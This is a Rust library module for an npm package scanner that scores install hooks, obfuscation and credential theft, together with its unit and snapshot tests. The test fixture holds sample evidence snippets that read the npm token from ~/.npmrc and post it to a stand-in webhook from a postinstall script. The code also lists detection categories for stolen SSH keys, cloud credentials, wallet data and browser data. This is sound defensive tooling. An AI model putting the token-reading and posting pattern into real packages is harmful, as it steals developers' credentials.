pub mod analyzer;
pub mod backend;
pub mod model;
pub mod score;
pub mod signals;

pub use analyzer::Analyzer;
pub use backend::heuristic::HeuristicAnalyzer;
pub use model::{
    CODE_EXTENSIONS, Decision, Evidence, FileFacts, FlowObs, LIFECYCLE_HOOKS, LifecycleHook,
    LifecycleScriptObs, MAX_FILE_BYTES, Manifest, PackageFacts, PackageVersion, Reason, ReasonCode,
    Sensitivity, Severity, SinkKind, SinkObs, SourceFile, SourceKind, SourceObs, Verdict,
};
pub use score::{ScoreConfig, score_reasons, score_reasons_with_config, severity_weight};

pub struct Engine<A> {
    analyzer: A,
    score_config: ScoreConfig,
}

impl Default for Engine<HeuristicAnalyzer> {
    fn default() -> Self {
        Self::new(HeuristicAnalyzer)
    }
}

impl<A: Analyzer> Engine<A> {
    #[must_use]
    pub fn new(analyzer: A) -> Self {
        Self {
            analyzer,
            score_config: ScoreConfig::default(),
        }
    }

    #[must_use]
    pub fn with_score_config(analyzer: A, score_config: ScoreConfig) -> Self {
        Self {
            analyzer,
            score_config,
        }
    }

    #[must_use]
    pub fn evaluate_against(
        &self,
        current: &PackageVersion,
        _baseline: Option<&PackageVersion>,
    ) -> Verdict {
        let facts = self.analyzer.analyze_package(current);
        let mut reasons = signals::manifest::run(&facts);
        normalize_reasons(&mut reasons);
        let (decision, score) = score_reasons_with_config(&reasons, self.score_config);

        Verdict {
            package: current.name.clone(),
            version: current.version.clone(),
            decision,
            score,
            analyzer: self.analyzer.name().to_string(),
            reasons,
        }
    }
}

fn normalize_reasons(reasons: &mut Vec<Reason>) {
    reasons.retain(|reason| !reason.evidence.is_empty());
    for reason in reasons.iter_mut() {
        reason.evidence.sort();
        reason.evidence.dedup();
    }
    reasons.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then(a.code.cmp(&b.code))
            .then(a.title.cmp(&b.title))
            .then(a.evidence.cmp(&b.evidence))
    });
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde::Serialize;
    use std::collections::BTreeMap;

    #[test]
    fn engine_evaluate_against_runs_manifest_signal() {
        let mut scripts = BTreeMap::new();
        scripts.insert("postinstall".to_string(), "node index.js".to_string());
        let package = PackageVersion {
            name: "case".to_string(),
            version: "1.0.0".to_string(),
            manifest: Manifest {
                name: "case".to_string(),
                version: "1.0.0".to_string(),
                scripts,
                raw: "{\n  \"scripts\": {\n    \"postinstall\": \"node index.js\"\n  }\n}"
                    .to_string(),
            },
            files: Vec::new(),
        };

        let verdict = Engine::default().evaluate_against(&package, None);

        assert_eq!(verdict.decision, Decision::Warn);
        assert_eq!(verdict.analyzer, "heuristic");
        assert_eq!(verdict.reasons.len(), 1);
        assert_eq!(verdict.reasons[0].code, ReasonCode::InstallScriptPresent);
    }

    #[test]
    fn verdict_round_trips_to_json() {
        let verdict = sample_verdict();
        let json = serde_json::to_string(&verdict).unwrap();
        let round_trip: Verdict = serde_json::from_str(&json).unwrap();
        assert_eq!(round_trip, verdict);
    }

    #[test]
    fn verdict_json_schema_snapshot() {
        #[derive(Serialize)]
        struct SchemaSnapshot {
            verdict: Verdict,
            decision_variants: [Decision; 3],
            severity_variants: [Severity; 5],
            reason_code_variants: [ReasonCode; 7],
            source_kind_variants: [SourceKind; 7],
            sink_kind_variants: [SinkKind; 4],
            lifecycle_hook_variants: [LifecycleHook; 3],
        }

        let snapshot = SchemaSnapshot {
            verdict: sample_verdict(),
            decision_variants: [Decision::Allow, Decision::Warn, Decision::Block],
            severity_variants: [
                Severity::Info,
                Severity::Low,
                Severity::Medium,
                Severity::High,
                Severity::Critical,
            ],
            reason_code_variants: [
                ReasonCode::InstallScriptPresent,
                ReasonCode::DangerousInstallScript,
                ReasonCode::Obfuscation,
                ReasonCode::DynamicEval,
                ReasonCode::KnownIoc,
                ReasonCode::CredentialExfiltration,
                ReasonCode::RiskIntroducedInRelease,
            ],
            source_kind_variants: [
                SourceKind::ProcessEnv,
                SourceKind::EnvFile,
                SourceKind::NpmToken,
                SourceKind::SshKey,
                SourceKind::AwsCredentials,
                SourceKind::WalletData,
                SourceKind::BrowserData,
            ],
            sink_kind_variants: [
                SinkKind::NetworkSend,
                SinkKind::ProcessExec,
                SinkKind::DynamicEval,
                SinkKind::FilesystemWrite,
            ],
            lifecycle_hook_variants: [
                LifecycleHook::Preinstall,
                LifecycleHook::Install,
                LifecycleHook::Postinstall,
            ],
        };

        let rendered = serde_json::to_string_pretty(&snapshot).unwrap();
        insta::assert_snapshot!(rendered, @r###"
{
  "verdict": {
    "package": "color-utils-pro",
    "version": "1.4.2",
    "decision": "block",
    "score": 155,
    "analyzer": "heuristic",
    "reasons": [
      {
        "code": "credential_exfiltration",
        "severity": "critical",
        "title": "npm auth token reaches the network",
        "detail": "The package reads an npm auth token and sends it to a network sink.",
        "evidence": [
          {
            "file": "scripts/setup.js",
            "line": 8,
            "snippet": "const t = fs.readFileSync(os.homedir()+'/.npmrc')"
          }
        ]
      },
      {
        "code": "known_ioc",
        "severity": "high",
        "title": "Reserved webhook exfiltration endpoint",
        "detail": "Code references a reserved webhook URL used as inert test evidence.",
        "evidence": [
          {
            "file": "scripts/setup.js",
            "line": 9,
            "snippet": "post('https://webhook.invalid/api/webhooks/...', t)"
          }
        ]
      },
      {
        "code": "install_script_present",
        "severity": "medium",
        "title": "postinstall script runs on install",
        "detail": "This package executes a postinstall lifecycle script.",
        "evidence": [
          {
            "file": "package.json",
            "line": 0,
            "snippet": "\"postinstall\": \"node scripts/setup.js\""
          }
        ]
      }
    ]
  },
  "decision_variants": [
    "allow",
    "warn",
    "block"
  ],
  "severity_variants": [
    "info",
    "low",
    "medium",
    "high",
    "critical"
  ],
  "reason_code_variants": [
    "install_script_present",
    "dangerous_install_script",
    "obfuscation",
    "dynamic_eval",
    "known_ioc",
    "credential_exfiltration",
    "risk_introduced_in_release"
  ],
  "source_kind_variants": [
    "process_env",
    "env_file",
    "npm_token",
    "ssh_key",
    "aws_credentials",
    "wallet_data",
    "browser_data"
  ],
  "sink_kind_variants": [
    "network_send",
    "process_exec",
    "dynamic_eval",
    "filesystem_write"
  ],
  "lifecycle_hook_variants": [
    "preinstall",
    "install",
    "postinstall"
  ]
}
"###);
    }

    fn sample_verdict() -> Verdict {
        Verdict {
            package: "color-utils-pro".to_string(),
            version: "1.4.2".to_string(),
            decision: Decision::Block,
            score: 155,
            analyzer: "heuristic".to_string(),
            reasons: vec![
                Reason {
                    code: ReasonCode::CredentialExfiltration,
                    severity: Severity::Critical,
                    title: "npm auth token reaches the network".to_string(),
                    detail: "The package reads an npm auth token and sends it to a network sink."
                        .to_string(),
                    evidence: vec![Evidence {
                        file: "scripts/setup.js".to_string(),
                        line: 8,
                        snippet: "const t = fs.readFileSync(os.homedir()+'/.npmrc')".to_string(),
                    }],
                },
                Reason {
                    code: ReasonCode::KnownIoc,
                    severity: Severity::High,
                    title: "Reserved webhook exfiltration endpoint".to_string(),
                    detail: "Code references a reserved webhook URL used as inert test evidence."
                        .to_string(),
                    evidence: vec![Evidence {
                        file: "scripts/setup.js".to_string(),
                        line: 9,
                        snippet: "post('https://webhook.invalid/api/webhooks/...', t)".to_string(),
                    }],
                },
                Reason {
                    code: ReasonCode::InstallScriptPresent,
                    severity: Severity::Medium,
                    title: "postinstall script runs on install".to_string(),
                    detail: "This package executes a postinstall lifecycle script.".to_string(),
                    evidence: vec![Evidence {
                        file: "package.json".to_string(),
                        line: 0,
                        snippet: "\"postinstall\": \"node scripts/setup.js\"".to_string(),
                    }],
                },
            ],
        }
    }
}
